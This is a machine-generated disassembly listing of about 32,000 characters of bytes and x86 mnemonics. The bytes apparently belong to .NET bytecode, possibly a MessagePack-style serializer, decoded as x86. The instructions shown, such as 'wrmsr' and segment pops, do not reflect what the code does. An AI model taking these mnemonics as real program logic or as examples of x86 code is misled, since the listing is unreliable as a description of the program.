  403119:	0a 06                	or     (%esi),%al
  40311b:	02 7d 25             	add    0x25(%ebp),%bh
  40311e:	00 00                	add    %al,(%eax)
  403120:	04 02                	add    $0x2,%al
  403122:	7b 26                	jnp    0x40314a
  403124:	00 00                	add    %al,(%eax)
  403126:	04 06                	add    $0x6,%al
  403128:	6f                   	outsl  %ds:(%esi),(%dx)
  403129:	5d                   	pop    %ebp
  40312a:	00 00                	add    %al,(%eax)
  40312c:	0a 06                	or     (%esi),%al
  40312e:	2a 00                	sub    (%eax),%al
  403130:	1b 30                	sbb    (%eax),%esi
  403132:	02 00                	add    (%eax),%al
  403134:	54                   	push   %esp
  403135:	00 00                	add    %al,(%eax)
  403137:	00 09                	add    %cl,(%ecx)
  403139:	00 00                	add    %al,(%eax)
  40313b:	11 15 0a 15 0b 03    	adc    %edx,0x30b150a
  403141:	6f                   	outsl  %ds:(%esi),(%dx)
  403142:	5b                   	pop    %ebx
  403143:	00 00                	add    %al,(%eax)
  403145:	0a 0c 02             	or     (%edx,%eax,1),%cl
  403148:	7b 26                	jnp    0x403170
  40314a:	00 00                	add    %al,(%eax)
  40314c:	04 6f                	add    $0x6f,%al
  40314e:	5e                   	pop    %esi
  40314f:	00 00                	add    %al,(%eax)
  403151:	0a 0d 2b 20 12 03    	or     0x312202b,%cl
  403157:	28 5f 00             	sub    %bl,0x0(%edi)
  40315a:	00 0a                	add    %cl,(%edx)
  40315c:	13 04 06             	adc    (%esi,%eax,1),%eax
  40315f:	17                   	pop    %ss
  403160:	58                   	pop    %eax
  403161:	0a 08                	or     (%eax),%cl
  403163:	11 04 7b             	adc    %eax,(%ebx,%edi,2)
  403166:	22 00                	and    (%eax),%al
  403168:	00 04 6f             	add    %al,(%edi,%ebp,2)
  40316b:	60                   	pusha
  40316c:	00 00                	add    %al,(%eax)
  40316e:	0a 2c 04             	or     (%esp,%eax,1),%ch
  403171:	06                   	push   %es
  403172:	0b de                	or     %esi,%ebx
  403174:	19 12                	sbb    %edx,(%edx)
  403176:	03 28                	add    (%eax),%ebp
  403178:	61                   	popa
  403179:	00 00                	add    %al,(%eax)
  40317b:	0a 2d d7 de 0e 12    	or     0x120eded7,%ch
  403181:	03 fe                	add    %esi,%edi
  403183:	16                   	push   %ss
  403184:	02 00                	add    (%eax),%al
  403186:	00 1b                	add    %bl,(%ebx)
  403188:	6f                   	outsl  %ds:(%esi),(%dx)
  403189:	33 00                	xor    (%eax),%eax
  40318b:	00 0a                	add    %cl,(%edx)
  40318d:	dc 07                	faddl  (%edi)
  40318f:	2a 01                	sub    (%ecx),%al
  403191:	10 00                	adc    %al,(%eax)
  403193:	00 02                	add    %al,(%edx)
  403195:	00 17                	add    %dl,(%edi)
  403197:	00 2d 44 00 0e 00    	add    %ch,0xe0044
  40319d:	00 00                	add    %al,(%eax)
  40319f:	00 13                	add    %dl,(%ebx)
  4031a1:	30 02                	xor    %al,(%edx)
  4031a3:	00 1b                	add    %bl,(%ebx)
  4031a5:	00 00                	add    %al,(%eax)
  4031a7:	00 01                	add    %al,(%ecx)
  4031a9:	00 00                	add    %al,(%eax)
  4031ab:	11 02                	adc    %eax,(%edx)
  4031ad:	03 28                	add    (%eax),%ebp
  4031af:	3b 00                	cmp    (%eax),%eax
  4031b1:	00 06                	add    %al,(%esi)
  4031b3:	0a 06                	or     (%esi),%al
  4031b5:	15 33 02 14 2a       	adc    $0x2a140233,%eax
  4031ba:	02 7b 26             	add    0x26(%ebx),%bh
  4031bd:	00 00                	add    %al,(%eax)
  4031bf:	04 06                	add    $0x6,%al
  4031c1:	6f                   	outsl  %ds:(%esi),(%dx)
  4031c2:	59                   	pop    %ecx
  4031c3:	00 00                	add    %al,(%eax)
  4031c5:	0a 2a                	or     (%edx),%ch
  4031c7:	00 13                	add    %dl,(%ebx)
  4031c9:	30 04 00             	xor    %al,(%eax,%eax,1)
  4031cc:	ad                   	lods   %ds:(%esi),%eax
  4031cd:	00 00                	add    %al,(%eax)
  4031cf:	00 0a                	add    %cl,(%edx)
  4031d1:	00 00                	add    %al,(%eax)
  4031d3:	11 02                	adc    %eax,(%edx)
  4031d5:	7b 26                	jnp    0x4031fd
  4031d7:	00 00                	add    %al,(%eax)
  4031d9:	04 6f                	add    $0x6f,%al
  4031db:	5a                   	pop    %edx
  4031dc:	00 00                	add    %al,(%eax)
  4031de:	0a 0c 08             	or     (%eax,%ecx,1),%cl
  4031e1:	1f                   	pop    %ds
  4031e2:	0f 30                	wrmsr
  4031e4:	13 20                	adc    (%eax),%esp
  4031e6:	80 00 00             	addb   $0x0,(%eax)
  4031e9:	00 08                	add    %cl,(%eax)
  4031eb:	d2 58 d2             	rcrb   %cl,-0x2e(%eax)
  4031ee:	0a 03                	or     (%ebx),%al
  4031f0:	06                   	push   %es
  4031f1:	6f                   	outsl  %ds:(%esi),(%dx)
  4031f2:	62 00                	bound  %eax,(%eax)
  4031f4:	00 0a                	add    %cl,(%edx)
  4031f6:	2b 53 08             	sub    0x8(%ebx),%edx
  4031f9:	20 ff                	and    %bh,%bh
  4031fb:	ff 00                	incl   (%eax)
  4031fd:	00 30                	add    %dh,(%eax)
  4031ff:	27                   	daa
  403200:	20 de                	and    %bl,%dh
  403202:	00 00                	add    %al,(%eax)
  403204:	00 0a                	add    %cl,(%edx)
  403206:	03 06                	add    (%esi),%eax
  403208:	6f                   	outsl  %ds:(%esi),(%dx)
  403209:	62 00                	bound  %eax,(%eax)
  40320b:	00 0a                	add    %cl,(%edx)
  40320d:	08 68 28             	or     %ch,0x28(%eax)
  403210:	63 00                	arpl   %eax,(%eax)
  403212:	00 0a                	add    %cl,(%edx)
  403214:	28 26                	sub    %ah,(%esi)
  403216:	00 00                	add    %al,(%eax)
  403218:	06                   	push   %es
  403219:	0b 03                	or     (%ebx),%eax
  40321b:	07                   	pop    %es
  40321c:	16                   	push   %ss
  40321d:	07                   	pop    %es
  40321e:	8e 69 6f             	mov    0x6f(%ecx),%gs
  403221:	4c                   	dec    %esp
  403222:	00 00                	add    %al,(%eax)
  403224:	0a 2b                	or     (%ebx),%ch
  403226:	24 20                	and    $0x20,%al
  403228:	df 00                	filds  (%eax)
  40322a:	00 00                	add    %al,(%eax)
  40322c:	0a 03                	or     (%ebx),%al
  40322e:	06                   	push   %es
  40322f:	6f                   	outsl  %ds:(%esi),(%dx)
  403230:	62 00                	bound  %eax,(%eax)
  403232:	00 0a                	add    %cl,(%edx)
  403234:	08 28                	or     %ch,(%eax)
  403236:	4a                   	dec    %edx
  403237:	00 00                	add    %al,(%eax)
  403239:	0a 28                	or     (%eax),%ch
  40323b:	26 00 00             	add    %al,%es:(%eax)
  40323e:	06                   	push   %es
  40323f:	0b 03                	or     (%ebx),%eax
  403241:	07                   	pop    %es
  403242:	16                   	push   %ss
  403243:	07                   	pop    %es
  403244:	8e 69 6f             	mov    0x6f(%ecx),%gs
  403247:	4c                   	dec    %esp
  403248:	00 00                	add    %al,(%eax)
  40324a:	0a 16                	or     (%esi),%dl
  40324c:	0d 2b 2d 03 02       	or     $0x2032d2b,%eax
  403251:	7b 26                	jnp    0x403279
  403253:	00 00                	add    %al,(%eax)
  403255:	04 09                	add    $0x9,%al
  403257:	6f                   	outsl  %ds:(%esi),(%dx)
  403258:	59                   	pop    %ecx
  403259:	00 00                	add    %al,(%eax)
  40325b:	0a 7b 21             	or     0x21(%ebx),%bh
  40325e:	00 00                	add    %al,(%eax)
  403260:	04 28                	add    $0x28,%al
  403262:	68 00 00 06 02       	push   $0x2060000
  403267:	7b 26                	jnp    0x40328f
  403269:	00 00                	add    %al,(%eax)
  40326b:	04 09                	add    $0x9,%al
  40326d:	6f                   	outsl  %ds:(%esi),(%dx)
  40326e:	59                   	pop    %ecx
  40326f:	00 00                	add    %al,(%eax)
  403271:	0a 03                	or     (%ebx),%al
  403273:	6f                   	outsl  %ds:(%esi),(%dx)
  403274:	58                   	pop    %eax
  403275:	00 00                	add    %al,(%eax)
  403277:	06                   	push   %es
  403278:	09 17                	or     %edx,(%edi)
  40327a:	58                   	pop    %eax
  40327b:	0d 09 08 32 cf       	or     $0xcf320809,%eax
  403280:	2a 00                	sub    (%eax),%al
  403282:	00 00                	add    %al,(%eax)
  403284:	13 30                	adc    (%eax),%esi
  403286:	04 00                	add    $0x0,%al
  403288:	96                   	xchg   %eax,%esi
  403289:	00 00                	add    %al,(%eax)
  40328b:	00 0a                	add    %cl,(%edx)
  40328d:	00 00                	add    %al,(%eax)
  40328f:	11 02                	adc    %eax,(%edx)
  403291:	7b 26                	jnp    0x4032b9
  403293:	00 00                	add    %al,(%eax)
  403295:	04 6f                	add    $0x6f,%al
  403297:	5a                   	pop    %edx
  403298:	00 00                	add    %al,(%eax)
  40329a:	0a 0c 08             	or     (%eax,%ecx,1),%cl
  40329d:	1f                   	pop    %ds
  40329e:	0f 30                	wrmsr
  4032a0:	13 20                	adc    (%eax),%esp
  4032a2:	90                   	nop
  4032a3:	00 00                	add    %al,(%eax)
  4032a5:	00 08                	add    %cl,(%eax)
  4032a7:	d2 58 d2             	rcrb   %cl,-0x2e(%eax)
  4032aa:	0a 03                	or     (%ebx),%al
  4032ac:	06                   	push   %es
  4032ad:	6f                   	outsl  %ds:(%esi),(%dx)
  4032ae:	62 00                	bound  %eax,(%eax)
  4032b0:	00 0a                	add    %cl,(%edx)
  4032b2:	2b 53 08             	sub    0x8(%ebx),%edx
  4032b5:	20 ff                	and    %bh,%bh
  4032b7:	ff 00                	incl   (%eax)
  4032b9:	00 30                	add    %dh,(%eax)
  4032bb:	27                   	daa
  4032bc:	20 dc                	and    %bl,%ah
  4032be:	00 00                	add    %al,(%eax)
  4032c0:	00 0a                	add    %cl,(%edx)
  4032c2:	03 06                	add    (%esi),%eax
  4032c4:	6f                   	outsl  %ds:(%esi),(%dx)
  4032c5:	62 00                	bound  %eax,(%eax)
  4032c7:	00 0a                	add    %cl,(%edx)
  4032c9:	08 68 28             	or     %ch,0x28(%eax)
  4032cc:	63 00                	arpl   %eax,(%eax)
  4032ce:	00 0a                	add    %cl,(%edx)
  4032d0:	28 26                	sub    %ah,(%esi)
  4032d2:	00 00                	add    %al,(%eax)
  4032d4:	06                   	push   %es
  4032d5:	0b 03                	or     (%ebx),%eax
  4032d7:	07                   	pop    %es
  4032d8:	16                   	push   %ss
  4032d9:	07                   	pop    %es
  4032da:	8e 69 6f             	mov    0x6f(%ecx),%gs
  4032dd:	4c                   	dec    %esp
  4032de:	00 00                	add    %al,(%eax)
  4032e0:	0a 2b                	or     (%ebx),%ch
  4032e2:	24 20                	and    $0x20,%al
  4032e4:	dd 00                	fldl   (%eax)
  4032e6:	00 00                	add    %al,(%eax)
  4032e8:	0a 03                	or     (%ebx),%al
  4032ea:	06                   	push   %es
  4032eb:	6f                   	outsl  %ds:(%esi),(%dx)
  4032ec:	62 00                	bound  %eax,(%eax)
  4032ee:	00 0a                	add    %cl,(%edx)
  4032f0:	08 28                	or     %ch,(%eax)
  4032f2:	4a                   	dec    %edx
  4032f3:	00 00                	add    %al,(%eax)
  4032f5:	0a 28                	or     (%eax),%ch
  4032f7:	26 00 00             	add    %al,%es:(%eax)
  4032fa:	06                   	push   %es
  4032fb:	0b 03                	or     (%ebx),%eax
  4032fd:	07                   	pop    %es
  4032fe:	16                   	push   %ss
  4032ff:	07                   	pop    %es
  403300:	8e 69 6f             	mov    0x6f(%ecx),%gs
  403303:	4c                   	dec    %esp
  403304:	00 00                	add    %al,(%eax)
  403306:	0a 16                	or     (%esi),%dl
  403308:	0d 2b 16 02 7b       	or     $0x7b02162b,%eax
  40330d:	26 00 00             	add    %al,%es:(%eax)
  403310:	04 09                	add    $0x9,%al
  403312:	6f                   	outsl  %ds:(%esi),(%dx)
  403313:	59                   	pop    %ecx
  403314:	00 00                	add    %al,(%eax)
  403316:	0a 03                	or     (%ebx),%al
  403318:	6f                   	outsl  %ds:(%esi),(%dx)
  403319:	58                   	pop    %eax
  40331a:	00 00                	add    %al,(%eax)
  40331c:	06                   	push   %es
  40331d:	09 17                	or     %edx,(%edi)
  40331f:	58                   	pop    %eax
  403320:	0d 09 08 32 e6       	or     $0xe6320809,%eax
  403325:	2a 00                	sub    (%eax),%al
  403327:	00 13                	add    %dl,(%ebx)
  403329:	30 02                	xor    %al,(%edx)
  40332b:	00 96 00 00 00 0b    	add    %dl,0xb000000(%esi)
  403331:	00 00                	add    %al,(%eax)
  403333:	11 02                	adc    %eax,(%edx)
  403335:	7b 24                	jnp    0x40335b
  403337:	00 00                	add    %al,(%eax)
  403339:	04 0a                	add    $0xa,%al
  40333b:	06                   	push   %es
  40333c:	1a 59 45             	sbb    0x45(%ecx),%bl
  40333f:	07                   	pop    %es
  403340:	00 00                	add    %al,(%eax)
  403342:	00 1f                	add    %bl,(%edi)
  403344:	00 00                	add    %al,(%eax)
  403346:	00 02                	add    %al,(%edx)
  403348:	00 00                	add    %al,(%eax)
  40334a:	00 13                	add    %dl,(%ebx)
  40334c:	00 00                	add    %al,(%eax)
  40334e:	00 68 00             	add    %ch,0x0(%eax)
  403351:	00 00                	add    %al,(%eax)
  403353:	35 00 00 00 46       	xor    $0x46000000,%eax
  403358:	00 00                	add    %al,(%eax)
  40335a:	00 57 00             	add    %dl,0x0(%edi)
  40335d:	00 00                	add    %al,(%eax)
  40335f:	2b 66 02             	sub    0x2(%esi),%esp
  403362:	7b 23                	jnp    0x403387
  403364:	00 00                	add    %al,(%eax)
  403366:	04 a5                	add    $0xa5,%al
  403368:	51                   	push   %ecx
  403369:	00 00                	add    %al,(%eax)
  40336b:	01 28                	add    %ebp,(%eax)
  40336d:	64 00 00             	add    %al,%fs:(%eax)
  403370:	0a 2a                	or     (%edx),%ch
  403372:	02 7b 23             	add    0x23(%ebx),%bh
  403375:	00 00                	add    %al,(%eax)
  403377:	04 a5                	add    $0xa5,%al
  403379:	52                   	push   %edx
  40337a:	00 00                	add    %al,(%eax)
  40337c:	01 2a                	add    %ebp,(%edx)
  40337e:	02 7b 23             	add    0x23(%ebx),%bh
  403381:	00 00                	add    %al,(%eax)
  403383:	04 6f                	add    $0x6f,%al
  403385:	38 00                	cmp    %al,(%eax)
  403387:	00 0a                	add    %cl,(%edx)
  403389:	6f                   	outsl  %ds:(%esi),(%dx)
  40338a:	65 00 00             	add    %al,%gs:(%eax)
  40338d:	0a 28                	or     (%eax),%ch
  40338f:	66 00 00             	data16 add %al,(%eax)
  403392:	0a 2a                	or     (%edx),%ch
  403394:	02 7b 23             	add    0x23(%ebx),%bh
  403397:	00 00                	add    %al,(%eax)
  403399:	04 a5                	add    $0xa5,%al
  40339b:	53                   	push   %ebx
  40339c:	00 00                	add    %al,(%eax)
  40339e:	01 28                	add    %ebp,(%eax)
  4033a0:	67 00 00             	add    %al,(%bx,%si)
  4033a3:	0a 2a                	or     (%edx),%ch
  4033a5:	02 7b 23             	add    0x23(%ebx),%bh
  4033a8:	00 00                	add    %al,(%eax)
  4033aa:	04 a5                	add    $0xa5,%al
  4033ac:	54                   	push   %esp
  4033ad:	00 00                	add    %al,(%eax)
  4033af:	01 28                	add    %ebp,(%eax)
  4033b1:	68 00 00 0a 2a       	push   $0x2a0a0000
  4033b6:	02 7b 23             	add    0x23(%ebx),%bh
  4033b9:	00 00                	add    %al,(%eax)
  4033bb:	04 a5                	add    $0xa5,%al
  4033bd:	55                   	push   %ebp
  4033be:	00 00                	add    %al,(%eax)
  4033c0:	01 28                	add    %ebp,(%eax)
  4033c2:	69 00 00 0a 2a 16    	imul   $0x162a0a00,(%eax),%eax
  4033c8:	6a 2a                	push   $0x2a
  4033ca:	00 00                	add    %al,(%eax)
  4033cc:	13 30                	adc    (%eax),%esi
  4033ce:	02 00                	add    (%eax),%al
  4033d0:	96                   	xchg   %eax,%esi
  4033d1:	00 00                	add    %al,(%eax)
  4033d3:	00 0b                	add    %cl,(%ebx)
  4033d5:	00 00                	add    %al,(%eax)
  4033d7:	11 02                	adc    %eax,(%edx)
  4033d9:	7b 24                	jnp    0x4033ff
  4033db:	00 00                	add    %al,(%eax)
  4033dd:	04 0a                	add    $0xa,%al
  4033df:	06                   	push   %es
  4033e0:	1a 59 45             	sbb    0x45(%ecx),%bl
  4033e3:	07                   	pop    %es
  4033e4:	00 00                	add    %al,(%eax)
  4033e6:	00 1f                	add    %bl,(%edi)
  4033e8:	00 00                	add    %al,(%eax)
  4033ea:	00 02                	add    %al,(%edx)
  4033ec:	00 00                	add    %al,(%eax)
  4033ee:	00 0e                	add    %cl,(%esi)
  4033f0:	00 00                	add    %al,(%eax)
  4033f2:	00 68 00             	add    %ch,0x0(%eax)
  4033f5:	00 00                	add    %al,(%eax)
  4033f7:	35 00 00 00 46       	xor    $0x46000000,%eax
  4033fc:	00 00                	add    %al,(%eax)
  4033fe:	00 57 00             	add    %dl,0x0(%edi)
  403401:	00 00                	add    %al,(%eax)
  403403:	2b 66 02             	sub    0x2(%esi),%esp
  403406:	7b 23                	jnp    0x40342b
  403408:	00 00                	add    %al,(%eax)
  40340a:	04 a5                	add    $0xa5,%al
  40340c:	51                   	push   %ecx
  40340d:	00 00                	add    %al,(%eax)
  40340f:	01 2a                	add    %ebp,(%edx)
  403411:	02 7b 23             	add    0x23(%ebx),%bh
  403414:	00 00                	add    %al,(%eax)
  403416:	04 a5                	add    $0xa5,%al
  403418:	51                   	push   %ecx
  403419:	00 00                	add    %al,(%eax)
  40341b:	01 28                	add    %ebp,(%eax)
  40341d:	6a 00                	push   $0x0
  40341f:	00 0a                	add    %cl,(%edx)
  403421:	2a 02                	sub    (%edx),%al
  403423:	7b 23                	jnp    0x403448
  403425:	00 00                	add    %al,(%eax)
  403427:	04 6f                	add    $0x6f,%al
  403429:	38 00                	cmp    %al,(%eax)
  40342b:	00 0a                	add    %cl,(%edx)
  40342d:	6f                   	outsl  %ds:(%esi),(%dx)
  40342e:	65 00 00             	add    %al,%gs:(%eax)
  403431:	0a 28                	or     (%eax),%ch
  403433:	6b 00 00             	imul   $0x0,(%eax),%eax
  403436:	0a 2a                	or     (%edx),%ch
  403438:	02 7b 23             	add    0x23(%ebx),%bh
  40343b:	00 00                	add    %al,(%eax)
  40343d:	04 a5                	add    $0xa5,%al
  40343f:	53                   	push   %ebx
  403440:	00 00                	add    %al,(%eax)
  403442:	01 28                	add    %ebp,(%eax)
  403444:	6c                   	insb   (%dx),%es:(%edi)
  403445:	00 00                	add    %al,(%eax)
  403447:	0a 2a                	or     (%edx),%ch
  403449:	02 7b 23             	add    0x23(%ebx),%bh
  40344c:	00 00                	add    %al,(%eax)
  40344e:	04 a5                	add    $0xa5,%al
  403450:	54                   	push   %esp
  403451:	00 00                	add    %al,(%eax)
  403453:	01 28                	add    %ebp,(%eax)
  403455:	6d                   	insl   (%dx),%es:(%edi)
  403456:	00 00                	add    %al,(%eax)
  403458:	0a 2a                	or     (%edx),%ch
  40345a:	02 7b 23             	add    0x23(%ebx),%bh
  40345d:	00 00                	add    %al,(%eax)
  40345f:	04 a5                	add    $0xa5,%al
  403461:	55                   	push   %ebp
  403462:	00 00                	add    %al,(%eax)
  403464:	01 28                	add    %ebp,(%eax)
  403466:	6e                   	outsb  %ds:(%esi),(%dx)
  403467:	00 00                	add    %al,(%eax)
  403469:	0a 2a                	or     (%edx),%ch
  40346b:	16                   	push   %ss
  40346c:	6a 2a                	push   $0x2a
  40346e:	00 00                	add    %al,(%eax)
  403470:	13 30                	adc    (%eax),%esi
  403472:	02 00                	add    (%eax),%al
  403474:	84 00                	test   %al,(%eax)
  403476:	00 00                	add    %al,(%eax)
  403478:	0b 00                	or     (%eax),%eax
  40347a:	00 11                	add    %dl,(%ecx)
  40347c:	02 7b 24             	add    0x24(%ebx),%bh
  40347f:	00 00                	add    %al,(%eax)
  403481:	04 0a                	add    $0xa,%al
  403483:	06                   	push   %es
  403484:	1a 59 45             	sbb    0x45(%ecx),%bl
  403487:	07                   	pop    %es
  403488:	00 00                	add    %al,(%eax)
  40348a:	00 13                	add    %dl,(%ebx)
  40348c:	00 00                	add    %al,(%eax)
  40348e:	00 02                	add    %al,(%edx)
  403490:	00 00                	add    %al,(%eax)
  403492:	00 4f 00             	add    %cl,0x0(%edi)
  403495:	00 00                	add    %al,(%eax)
  403497:	4f                   	dec    %edi
  403498:	00 00                	add    %al,(%eax)
  40349a:	00 24 00             	add    %ah,(%eax,%eax,1)
  40349d:	00 00                	add    %al,(%eax)
  40349f:	30 00                	xor    %al,(%eax)
  4034a1:	00 00                	add    %al,(%eax)
  4034a3:	3d 00 00 00 2b       	cmp    $0x2b000000,%eax
  4034a8:	4d                   	dec    %ebp
  4034a9:	02 7b 23             	add    0x23(%ebx),%bh
  4034ac:	00 00                	add    %al,(%eax)
  4034ae:	04 a5                	add    $0xa5,%al
  4034b0:	51                   	push   %ecx
  4034b1:	00 00                	add    %al,(%eax)
  4034b3:	01 28                	add    %ebp,(%eax)
  4034b5:	6f                   	outsl  %ds:(%esi),(%dx)
  4034b6:	00 00                	add    %al,(%eax)
  4034b8:	0a 2a                	or     (%edx),%ch
  4034ba:	02 7b 23             	add    0x23(%ebx),%bh
  4034bd:	00 00                	add    %al,(%eax)
  4034bf:	04 74                	add    $0x74,%al
  4034c1:	39 00                	cmp    %eax,(%eax)
  4034c3:	00 01                	add    %al,(%ecx)
  4034c5:	28 70 00             	sub    %dh,0x0(%eax)
  4034c8:	00 0a                	add    %cl,(%edx)
  4034ca:	2a 02                	sub    (%edx),%al
  4034cc:	7b 23                	jnp    0x4034f1
  4034ce:	00 00                	add    %al,(%eax)
  4034d0:	04 a5                	add    $0xa5,%al
  4034d2:	53                   	push   %ebx
  4034d3:	00 00                	add    %al,(%eax)
  4034d5:	01 2a                	add    %ebp,(%edx)
  4034d7:	02 7b 23             	add    0x23(%ebx),%bh
  4034da:	00 00                	add    %al,(%eax)
  4034dc:	04 a5                	add    $0xa5,%al
  4034de:	54                   	push   %esp
  4034df:	00 00                	add    %al,(%eax)
  4034e1:	01 6c 2a 02          	add    %ebp,0x2(%edx,%ebp,1)
  4034e5:	7b 23                	jnp    0x40350a
  4034e7:	00 00                	add    %al,(%eax)
  4034e9:	04 a5                	add    $0xa5,%al
  4034eb:	55                   	push   %ebp
  4034ec:	00 00                	add    %al,(%eax)
  4034ee:	01 28                	add    %ebp,(%eax)
  4034f0:	6e                   	outsb  %ds:(%esi),(%dx)
  4034f1:	00 00                	add    %al,(%eax)
  4034f3:	0a 6c 2a 23          	or     0x23(%edx,%ebp,1),%ch
	...
  4034ff:	2a 13                	sub    (%ebx),%dl
  403501:	30 02                	xor    %al,(%edx)
  403503:	00 a1 00 00 00 0c    	add    %ah,0xc000000(%ecx)
  403509:	00 00                	add    %al,(%eax)
  40350b:	11 02                	adc    %eax,(%edx)
  40350d:	7b 24                	jnp    0x403533
  40350f:	00 00                	add    %al,(%eax)
  403511:	04 0a                	add    $0xa,%al
  403513:	06                   	push   %es
  403514:	1a 59 45             	sbb    0x45(%ecx),%bl
  403517:	08 00                	or     %al,(%eax)
  403519:	00 00                	add    %al,(%eax)
  40351b:	13 00                	adc    (%eax),%eax
  40351d:	00 00                	add    %al,(%eax)
  40351f:	02 00                	add    (%eax),%al
  403521:	00 00                	add    %al,(%eax)
  403523:	6b 00 00             	imul   $0x0,(%eax),%eax
  403526:	00 6b 00             	add    %ch,0x0(%ebx)
  403529:	00 00                	add    %al,(%eax)
  40352b:	24 00                	and    $0x0,%al
  40352d:	00 00                	add    %al,(%eax)
  40352f:	35 00 00 00 46       	xor    $0x46000000,%eax
  403534:	00 00                	add    %al,(%eax)
  403536:	00 5f 00             	add    %bl,0x0(%edi)
  403539:	00 00                	add    %al,(%eax)
  40353b:	2b 69 02             	sub    0x2(%ecx),%ebp
  40353e:	7b 23                	jnp    0x403563
  403540:	00 00                	add    %al,(%eax)
  403542:	04 a5                	add    $0xa5,%al
  403544:	51                   	push   %ecx
  403545:	00 00                	add    %al,(%eax)
  403547:	01 28                	add    %ebp,(%eax)
  403549:	56                   	push   %esi
  40354a:	00 00                	add    %al,(%eax)
  40354c:	0a 2a                	or     (%edx),%ch
  40354e:	02 7b 23             	add    0x23(%ebx),%bh
  403551:	00 00                	add    %al,(%eax)
  403553:	04 6f                	add    $0x6f,%al
  403555:	38 00                	cmp    %al,(%eax)
  403557:	00 0a                	add    %cl,(%edx)
  403559:	28 22                	sub    %ah,(%edx)
  40355b:	00 00                	add    %al,(%eax)
  40355d:	06                   	push   %es
  40355e:	2a 02                	sub    (%edx),%al
  403560:	7b 23                	jnp    0x403585
  403562:	00 00                	add    %al,(%eax)
  403564:	04 a5                	add    $0xa5,%al
  403566:	53                   	push   %ebx
  403567:	00 00                	add    %al,(%eax)
  403569:	01 28                	add    %ebp,(%eax)
  40356b:	57                   	push   %edi
  40356c:	00 00                	add    %al,(%eax)
  40356e:	0a 2a                	or     (%edx),%ch
  403570:	02 7b 23             	add    0x23(%ebx),%bh
  403573:	00 00                	add    %al,(%eax)
  403575:	04 a5                	add    $0xa5,%al
  403577:	54                   	push   %esp
  403578:	00 00                	add    %al,(%eax)
  40357a:	01 28                	add    %ebp,(%eax)
  40357c:	71 00                	jno    0x40357e
  40357e:	00 0a                	add    %cl,(%edx)
  403580:	2a 02                	sub    (%edx),%al
  403582:	7b 23                	jnp    0x4035a7
  403584:	00 00                	add    %al,(%eax)
  403586:	04 a5                	add    $0xa5,%al
  403588:	55                   	push   %ebp
  403589:	00 00                	add    %al,(%eax)
  40358b:	01 0b                	add    %ecx,(%ebx)
  40358d:	12 01                	adc    (%ecx),%al
  40358f:	28 72 00             	sub    %dh,0x0(%edx)
  403592:	00 0a                	add    %cl,(%edx)
  403594:	28 56 00             	sub    %dl,0x0(%esi)
  403597:	00 0a                	add    %cl,(%edx)
  403599:	2a 02                	sub    (%edx),%al
  40359b:	7b 23                	jnp    0x4035c0
  40359d:	00 00                	add    %al,(%eax)
  40359f:	04 74                	add    $0x74,%al
  4035a1:	03 00                	add    (%eax),%eax
  4035a3:	00 1b                	add    %bl,(%ebx)
  4035a5:	2a 16                	sub    (%esi),%dl
  4035a7:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  4035ab:	01 2a                	add    %ebp,(%edx)
  4035ad:	00 00                	add    %al,(%eax)
  4035af:	00 13                	add    %dl,(%ebx)
  4035b1:	30 04 00             	xor    %al,(%eax,%eax,1)
  4035b4:	48                   	dec    %eax
  4035b5:	00 00                	add    %al,(%eax)
  4035b7:	00 0d 00 00 11 03    	add    %cl,0x3110000
  4035bd:	28 73 00             	sub    %dh,0x0(%ebx)
  4035c0:	00 0a                	add    %cl,(%edx)
  4035c2:	2c 3e                	sub    $0x3e,%al
  4035c4:	14 0a                	adc    $0xa,%al
  4035c6:	03 19                	add    (%ecx),%ebx
  4035c8:	17                   	pop    %ss
  4035c9:	17                   	pop    %ss
  4035ca:	73 74                	jae    0x403640
  4035cc:	00 00                	add    %al,(%eax)
  4035ce:	0a 0b                	or     (%ebx),%cl
  4035d0:	07                   	pop    %es
  4035d1:	6f                   	outsl  %ds:(%esi),(%dx)
  4035d2:	75 00                	jne    0x4035d4
  4035d4:	00 0a                	add    %cl,(%edx)
  4035d6:	d4 8d                	aam    $0x8d
  4035d8:	44                   	inc    %esp
  4035d9:	00 00                	add    %al,(%eax)
  4035db:	01 0a                	add    %ecx,(%edx)
  4035dd:	07                   	pop    %es
  4035de:	06                   	push   %es
  4035df:	16                   	push   %ss
  4035e0:	07                   	pop    %es
  4035e1:	6f                   	outsl  %ds:(%esi),(%dx)
  4035e2:	75 00                	jne    0x4035e4
  4035e4:	00 0a                	add    %cl,(%edx)
  4035e6:	69 6f 45 00 00 0a 26 	imul   $0x260a0000,0x45(%edi),%ebp
  4035ed:	07                   	pop    %es
  4035ee:	6f                   	outsl  %ds:(%esi),(%dx)
  4035ef:	76 00                	jbe    0x4035f1
  4035f1:	00 0a                	add    %cl,(%edx)
  4035f3:	07                   	pop    %es
  4035f4:	6f                   	outsl  %ds:(%esi),(%dx)
  4035f5:	41                   	inc    %ecx
  4035f6:	00 00                	add    %al,(%eax)
  4035f8:	0a 02                	or     (%edx),%al
  4035fa:	06                   	push   %es
  4035fb:	28 47 00             	sub    %al,0x0(%edi)
  4035fe:	00 06                	add    %al,(%esi)
  403600:	17                   	pop    %ss
  403601:	2a 16                	sub    (%esi),%dl
  403603:	2a 13                	sub    (%ebx),%dl
  403605:	30 04 00             	xor    %al,(%eax,%eax,1)
  403608:	97                   	xchg   %eax,%edi
  403609:	00 00                	add    %al,(%eax)
  40360b:	00 0e                	add    %cl,(%esi)
  40360d:	00 00                	add    %al,(%eax)
  40360f:	11 02                	adc    %eax,(%edx)
  403611:	0a 03                	or     (%ebx),%al
  403613:	6f                   	outsl  %ds:(%esi),(%dx)
  403614:	65 00 00             	add    %al,%gs:(%eax)
  403617:	0a 19                	or     (%ecx),%bl
  403619:	8d 3a                	lea    (%edx),%edi
  40361b:	00 00                	add    %al,(%eax)
  40361d:	01 25 d0 45 00 00    	add    %esp,0x45d0
  403623:	04 28                	add    $0x28,%al
  403625:	78 00                	js     0x403627
  403627:	00 0a                	add    %cl,(%edx)
  403629:	6f                   	outsl  %ds:(%esi),(%dx)
  40362a:	28 00                	sub    %al,(%eax)
  40362c:	00 0a                	add    %cl,(%edx)
  40362e:	0c 14                	or     $0x14,%al
  403630:	0d 08 8e 2d 02       	or     $0x22d8e08,%eax
  403635:	14 2a                	adc    $0x2a,%al
  403637:	08 8e 69 17 31 36    	or     %cl,0x36311769(%esi)
  40363d:	16                   	push   %ss
  40363e:	13 05 2b 28 08 11    	adc    0x1108282b,%eax
  403644:	05 9a 0d 06 09       	add    $0x9060d9a,%eax
  403649:	6f                   	outsl  %ds:(%esi),(%dx)
